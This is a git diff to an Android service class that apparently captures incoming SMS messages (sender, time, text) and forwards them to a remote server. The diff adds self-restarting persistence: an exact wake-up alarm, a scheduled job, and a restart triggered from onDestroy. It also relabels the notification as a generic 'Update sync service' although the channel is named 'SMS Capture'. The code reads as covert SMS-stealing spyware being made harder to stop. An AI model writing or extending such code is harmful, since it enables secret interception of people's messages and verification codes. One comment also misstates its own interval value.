@@ -1,29 +1,22 @@
 package com.example.VenLit;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Build;
+import android.content.SharedPreferences;
 import android.os.IBinder;
 import android.os.PowerManager;
-
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 import androidx.work.Constraints;
-import androidx.work.Data;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.WorkManager;
-
-import com.example.VenLit.SmsApi;
-import com.example.VenLit.SmsData;
-import com.example.VenLit.SmsResponse;
-import com.example.VenLit.SmsQueueManager;
-
-import java.util.concurrent.TimeUnit;
-
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -31,6 +24,8 @@ import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
 
 public class SmsService extends Service {
+    public static final String PREFS_NAME ="ServicePrefs" ;
+    public static final String KEY_LAST_ACTIVE = "lastActive";
     private Retrofit retrofit;
     private PowerManager.WakeLock wakeLock;
     private SmsQueueManager smsQueueManager;
@@ -49,6 +44,8 @@ public class SmsService extends Service {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         smsQueueManager = new SmsQueueManager(this);
+        CheckServiceJobService.scheduleJob(this);
+        scheduleServiceRestart(this);
     }
 
     @Override
@@ -57,12 +54,17 @@ public class SmsService extends Service {
         Notification notification = createNotification();
         startForeground(NOTIFICATION_ID, notification);
 
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        prefs.edit().putLong(KEY_LAST_ACTIVE, System.currentTimeMillis()).apply();
+
+
         if (intent != null && ACTION_SEND_SMS.equals(intent.getAction())) {
             String sender = intent.getStringExtra(EXTRA_SENDER);
             long timestamp = intent.getLongExtra(EXTRA_TIMESTAMP, 0L);
             String message = intent.getStringExtra(EXTRA_MESSAGE);
             sendMessage(sender, timestamp, message);
         }
+
 
         return START_STICKY;
     }
@@ -85,12 +87,12 @@ public class SmsService extends Service {
         Call<SmsResponse> call = api.sendSms(smsData);
         call.enqueue(new Callback<SmsResponse>() {
             @Override
-            public void onResponse(Call<SmsResponse> call, Response<SmsResponse> response) {
+            public void onResponse(@NonNull Call<SmsResponse> call, @NonNull Response<SmsResponse> response) {
                 releaseWakeLock();
             }
 
             @Override
-            public void onFailure(Call<SmsResponse> call, Throwable t) {
+            public void onFailure(@NonNull Call<SmsResponse> call, @NonNull Throwable t) {
                 smsQueueManager.enqueueSms(smsData);
                 releaseWakeLock();
                 enqueueResendWorker();
@@ -122,28 +124,43 @@ public class SmsService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        onStartCommand(null, 0, 0);
         releaseWakeLock();
     }
 
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("")
-                .setContentText("")
+                .setContentTitle("Android Service")
+                .setContentText("Update sync service")
                 .setSmallIcon(R.drawable.ic_launcher_background)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setOngoing(true)
                 .build();
     }
 
     private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    CHANNEL_NAME,
-                    NotificationManager.IMPORTANCE_LOW
-            );
-            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
-                    .createNotificationChannel(channel);
+        NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                CHANNEL_NAME,
+                NotificationManager.IMPORTANCE_LOW
+        );
+        ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
+                .createNotificationChannel(channel);
+    }
+
+    private void scheduleServiceRestart(Context context) {
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+        Intent intent = new Intent(context, SmsService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+        long interval = 3 * 60 * 1000; // 15 minutes
+        long triggerTime = System.currentTimeMillis() + interval;
+
+        if (alarmManager != null) {
+            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
         }
     }
+
 
     public static final String CHANNEL_ID = "sms-service-channel";
     public static final String CHANNEL_NAME = "SMS Capture";
